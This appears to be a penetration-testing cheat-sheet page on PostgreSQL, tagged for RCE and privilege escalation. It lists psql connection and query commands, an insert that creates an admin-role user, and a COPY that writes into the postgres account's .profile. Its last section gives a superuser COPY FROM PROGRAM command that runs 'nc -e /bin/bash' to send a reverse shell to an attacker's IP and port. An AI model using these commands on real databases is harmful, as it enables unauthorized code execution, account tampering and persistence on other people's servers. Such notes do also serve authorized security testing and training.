---
title: "Postgresql"
date: 2024-7-9
tags: ["Database Dumping", "Privilege Escalation In Databases", "Postgresql", "RCE", "Database"]
---

### Connect

```console
psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME>
```

```console
psql 'postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>'
```

### Basic

```console
# Show databases
\list
```

```console
# Use database
\connect <DB_NAME>
```

```console
# Show tables in current database
\dt
```

```console
# Dump data from table
select * from <TABLE_NAME>;
```

```console
# Insert data into table (e.g)
insert into <TABLE_NAME> (username, password, role) values ('user', 'password', 'admin');
```

```console
# Write text
copy (select '<STRING>') to '/var/lib/postgresql/.profile';
```

```console
# Exit
\q
```

---

### RCE

```console
# Only superuser
CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash <LOCAL_IP> <LOCAL_PORT> &'
```